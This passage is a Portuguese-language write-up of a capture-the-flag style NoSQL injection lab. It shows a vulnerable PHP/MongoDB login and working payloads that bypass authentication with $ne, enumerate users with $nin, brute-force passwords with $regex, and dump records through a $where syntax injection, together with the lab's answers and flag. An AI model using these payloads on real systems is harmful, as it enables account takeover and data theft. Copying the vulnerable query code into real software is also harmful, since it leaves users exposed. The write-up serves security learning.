+    <a href="#consultando-banco-de-dados" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>A consulta é realizada em <code>chave-valor</code> nos documentos, por exemplo.</p>
+<p>![key-value](/assets/img/posts/2025/03/nosql-injection/nosql-pairs.png</p>
+<p>Pesquisando somente por <code>last_name</code>:
+<code>['last_name' =&gt; 'Sandler']</code></p>
+<p>Realizando duas condição (<code>and</code>):
+<code>['gender' =&gt; 'male', 'last_name' =&gt; 'Phillips']</code></p>
+<p>Pesquisando menor que:
+<code>['age' =&gt; ['$lt'=&gt;'50']]</code></p>
+<p>Mais operadores: <code>https://www.mongodb.com/pt-br/docs/manual/reference/operator/query/</code></p>
+<p><strong>What is a group of documents in MongoDB is known as?</strong><br>
+R:<code>collection</code></p>
+<p><strong>Using the MongoDB Operator Reference, what operator is used to filter data when a field isn&rsquo;t equal to a given value?</strong><br>
+R:<code>$ne</code></p>
+<p><strong>Following the example of the 3 documents given before, how many documents would be returned by the following filter: <code>['gender' =&gt; ['$ne' =&gt; 'female'] , 'age' =&gt; ['$gt'=&gt;'65'] ]</code>?</strong><br>
+R: <code>0</code></p>
+<h2 data-hextra-search-id="nosql-injection">NoSQL injection<span class="hx:absolute hx:-mt-20" id="nosql-injection"></span>
+    <a href="#nosql-injection" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Assim como no <strong>SQL injection</strong> o NoSQL injection podemos encerrar a consulta atual e manipular, para realizarmos outra, além disso, também temos o <strong>operator injection</strong>, nesse caso injetamos um NoSQL para alterar o comportamento da consulta, sendo assim temos dois tipos:</p>
+<ul>
+<li>NoSQL injection</li>
+<li>Operator Injection</li>
+</ul>
+<h3 data-hextra-search-id="exemplo">Exemplo<span class="hx:absolute hx:-mt-20" id="exemplo"></span>
+    <a href="#exemplo" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Neste exemplo iremos explorar o ataque de <code>operator injection</code>.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$con <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">MongoDB\Driver\Manager</span>(<span style="color:#e6db74">&#34;mongodb://localhost:27017&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;user&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;pass&#39;</span>])){
+</span></span><span style="display:flex;"><span>        $user <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;user&#39;</span>];
+</span></span><span style="display:flex;"><span>        $pass <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $q <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">MongoDB\Driver\Query</span>([<span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">=&gt;</span>$user, <span style="color:#e6db74">&#39;password&#39;</span><span style="color:#f92672">=&gt;</span>$pass]);
+</span></span><span style="display:flex;"><span>        $record <span style="color:#f92672">=</span> $con<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">executeQuery</span>(<span style="color:#e6db74">&#39;myapp.login&#39;</span>, $q );
+</span></span><span style="display:flex;"><span>        $record <span style="color:#f92672">=</span> <span style="color:#a6e22e">iterator_to_array</span>($record);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">sizeof</span>($record)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>                $usr <span style="color:#f92672">=</span> $record[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>                $_SESSION[<span style="color:#e6db74">&#39;loggedin&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>                $_SESSION[<span style="color:#e6db74">&#39;uid&#39;</span>] <span style="color:#f92672">=</span> $usr<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: /sekr3tPl4ce.php&#39;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: /?err=1&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>A consulta feita no banco de dados:</p>
+<p><code>['username'=&gt;$user, 'password'=&gt;$pass]</code></p>
+<p>Podemos manipular da seguinte maneira:</p>
+<p><code>['username'=&gt;['$ne'=&gt;'xxxx'], 'password'=&gt;['$ne'=&gt;'yyyy']]</code></p>
+<p>Neste caso, qualquer usuário e senha, diferente de <code>xxxx</code>e <code>yyyy</code>já é valido, podemos autenticar na aplicação utilizando o primeiro <code>documento</code> que é retornado na consulta.</p>
+<p><strong>What type of NoSQL Injection is similar to normal SQL Injection?</strong><br>
+R: <code>Syntax</code></p>
+<p><strong>What type of NoSQL Injection allows you to modify the behaviour of the query, even if you can&rsquo;t escape the syntax?</strong><br>
+R: <code>Operator</code></p>
+<h2 data-hextra-search-id="bypassing-the-login-screen">Bypassing the Login Screen<span class="hx:absolute hx:-mt-20" id="bypassing-the-login-screen"></span>
+    <a href="#bypassing-the-login-screen" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-bypassing.png" alt="Bypassing"  loading="lazy" /></p>
+<p>Alteramos nossa requisição no Burp Suite, inserindo <code>[$ne]</code>.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-headers-http.png" alt="HTTP-headers"  loading="lazy" /></p>
+<p>Com isso realizamos o bypass da autenticação.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-bypassed.png" alt="Bypassed"  loading="lazy" /></p>
+<p><strong>When bypassing the login screen using the $ne operator, what is the email of the user that you are logged in as?</strong><br>
+R: <code>admin@nosql.int</code></p>
+<h2 data-hextra-search-id="operator-injection-logging-in-as-other-users">Operator Injection: Logging in as Other Users<span class="hx:absolute hx:-mt-20" id="operator-injection-logging-in-as-other-users"></span>
+    <a href="#operator-injection-logging-in-as-other-users" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>No ataque anterior somos limitado com qual usuário podemos acessar, o acesso é feito com o primeiro resultado que a pesquisa retorna. Podemos também acessar com outro usuário, com o operador <code>$nin</code> conseguimos alterar o usuário que acessamos, a definição do operador.</p>
+<ul>
+<li><code>$nin</code>: Não corresponde a nenhum dos valores especificados em uma array.</li>
+</ul>
+<p>Já sabemos um usuário que existe <code>admin</code>, agora podemos especificar ele no operador <code>$nin</code>, assim iremos acessar com outro usuário.</p>
+<pre><code>user[$nin][]=admin&amp;pass[$ne]=adsdasdas&amp;remember=on
+</code></pre>
+<p>A consulta como ficaria.</p>
+<pre><code>['username'=&gt;['$nin'=&gt;['admin'] ], 'password'=&gt;['$ne'=&gt;'aweasdf']]
+</code></pre>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-pedro.png" alt="Pedro"  loading="lazy" /></p>
+<p>Assim utilizamos a mesma logica, para ir para o terceiro usuário que o banco retorna, dessa forma podemos enumerar todos os usuários do banco de dados.</p>
+<p><strong>How many users are there in total?</strong></p>
+<p>Precisamos realizar a pesquisa até atingir a tela de usuário inválido <code>/?err=1</code>.
+Payload utilizado:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>user[$nin][]=admin&amp;user[$nin][]=pedro&amp;user[$nin][]=john&amp;user[$nin][]=secret&amp;pass[$ne]=adsdasdas&amp;remember=on</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>A consulta:</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>[&#39;username&#39;=&gt;[&#39;$nin&#39;=&gt;[&#39;admin&#39;,&#39;pedro&#39;,&#39;john&#39;,&#39;secret&#39;] ], &#39;password&#39;=&gt;[&#39;$ne&#39;=&gt;&#39;aweasdf&#39;]]</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>R:<code>4</code></p>
+<p><strong>There is a user that starts with the letter &ldquo;p&rdquo;. What is his username?</strong><br>
+R:<code>pedro</code></p>
+<h2 data-hextra-search-id="operator-injection-extracting-users-passwords">Operator Injection: Extracting Users&rsquo; Passwords<span class="hx:absolute hx:-mt-20" id="operator-injection-extracting-users-passwords"></span>
+    <a href="#operator-injection-extracting-users-passwords" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Temos acesso a todas as contas, porém não sabemos as senhas, é importante saber a senha pois dessa forma podemos comprometer outros serviços.</p>
+<p>Vamos utilizar o operador <code>$regex</code>, sua definção:</p>
+<p><code>Seleciona documentos onde os valores correspondem a uma expressão regular especificada.</code></p>
+<p>Podemos advinha o <strong>comprimento</strong> da senha e depois advinha quais caracteres a senha possui.</p>
+<p>Descobrindo o <strong>comprimento</strong> da senha:</p>
+<ul>
+<li><code>[$regex]=^.{7}$</code>: estamos perguntando se o parâmetro <code>pass</code> possui comprimento de 7.</li>
+</ul>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-regex.png" alt="Regex"  loading="lazy" /></p>
+<p>Através da página de <code>/?err=1</code> sabemos que a condição não é verdadeira, sendo assim o comprimento pode ser maior ou menor.
+O <strong>comprimento</strong> é de 8.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-regex2.png" alt="regex2"  loading="lazy" /></p>
+<p>Sabendo o <strong>comprimento</strong>, agora iremos descobrir a senha, testando cada caractere (a-Z, 0-9) e também os especiais, o usuário <code>john</code>possui apenas números na senha, conforme a dica na pergunta.</p>
+<pre><code>Question Hint  
+The password consists of numbers only.
+</code></pre>
+<p>Com <code>^0.......$</code>vamos iniciar o teste, de 0-9 , depois de descobrir vamos passar para o segundo caractere <code>^00......$</code>, até descobrirmos os 8 números da senha.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-brute.png" alt="Brute"  loading="lazy" /></p>
+<p>Assim vamos descobrindo cada número da senha.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-brute2.png" alt="Brute2"  loading="lazy" /></p>
+<p>Senha descoberta.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-password.png" alt="password"  loading="lazy" /></p>
+<p><strong>What is john&rsquo;s password?</strong><br>
+R:<code>10584312</code></p>
+<p><strong>One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag!</strong></p>
+<p>{: .prompt-tip }
+Question Hint</p>
+<pre><code>The user is the same as the answer for question 2 of task 5.
+</code></pre>
+<p>Payload para descobrir o comprimento:</p>
+<p><code>user=pedro&amp;pass[$regex]=^.{11}$&amp;remember=on</code></p>
+<p>Lista com todas as letras do alfabeto.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>crunch <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz &gt;&gt; numbers.txt</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-crunch.png" alt="crunch"  loading="lazy" /></p>
+<p>Payload de teste no <code>intruder</code>: <code>user=pedro&amp;pass[$regex]=^§a§..........$&amp;remember=on</code></p>
+<p>Encontramos a senha, após testar todos os 11 caracteres.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-regex-password.png" alt="password regex"  loading="lazy" /></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ip-10-10-4-224:~# ssh pedro@10.10.201.31
+</span></span><span style="display:flex;"><span>pedro@10.10.201.31<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-147-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span></span><span style="display:flex;"><span>applicable law.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Wed Jun <span style="color:#ae81ff">23</span> 03:34:24 <span style="color:#ae81ff">2021</span> from 192.168.100.250
+</span></span><span style="display:flex;"><span>pedro@nosql-nolife:~$ cat flag.txt 
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>N0Sql_n01iF3!<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>pedro@nosql-nolife:~$ </span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h2 data-hextra-search-id="syntax-injection-identification-and-data-extraction">Syntax Injection: Identification and Data Extraction<span class="hx:absolute hx:-mt-20" id="syntax-injection-identification-and-data-extraction"></span>
+    <a href="#syntax-injection-identification-and-data-extraction" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>A aplicação retorna o e-mail de qualquer usuário.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-sintax.png" alt="Syntax"  loading="lazy" /></p>
+<p>Podemos testar se aplicação é vulnerável a injeção com um <code>'</code>.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-application.png" alt="Application"  loading="lazy" /></p>
+<p>Com a mensagem acima sabemos que a aplicação não realiza as devidas verificações, olhando o código da aplicação, a string passada é concatenada na consulta.</p>
+<p><code>for x in mycol.find({&quot;$where&quot;: &quot;this.username == '&quot; + username + &quot;'&quot;}):</code></p>
+<p>Sendo assim, podemos realizar uma condição verdadeira e verificar o retorno.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ip-10-10-4-224:~# ssh syntax@10.10.201.31
+</span></span><span style="display:flex;"><span>syntax@10.10.201.31<span style="color:#e6db74">&#39;s password: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Please provide the username to receive their email:&#39;</span><span style="color:#f92672">||</span>1<span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>admin@nosql.int
+</span></span><span style="display:flex;"><span>pcollins@nosql.int
+</span></span><span style="display:flex;"><span>jsmith@nosql.int
+</span></span><span style="display:flex;"><span>Syntax@Injection.FTW
+</span></span><span style="display:flex;"><span>Connection to 10.10.201.31 closed.
+</span></span><span style="display:flex;"><span>root@ip-10-10-4-224:~# </span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>É retornado todos os e-mails da aplicação, dessa forma, realizamos o dump de todos os e-mail.</p>
+<p><strong>What common character is used to test for injection in both SQL and NoSQL solutions?</strong><br>
+R:<code>'</code></p>
+<p><strong>What is the email value of the super secret user returned in the last entry?</strong><br>
+R:<code>Syntax@Injection.FTW</code></p>
+<h2 data-hextra-search-id="conclusão">Conclusão<span class="hx:absolute hx:-mt-20" id="conclusão"></span>
+    <a href="#conclus%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Na aula é apresentado diversas formas de NoSQL injection, de uma forma teórica e prática, apresentando a exploração de operadores e sintaxe.</p>
+
+          
+        </div>
+        <div class="hx:mt-16"></div>
+        
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hx:mx-auto hx:flex hx:gap-2 hx:py-2 hx:px-4 hextra-max-footer-width"><div class="hx:flex hx:justify-items-start ">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-03-06-nosql-injection/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden">Claro</span><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden">Escuro</span><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+<span class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden">Sistema</span></div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
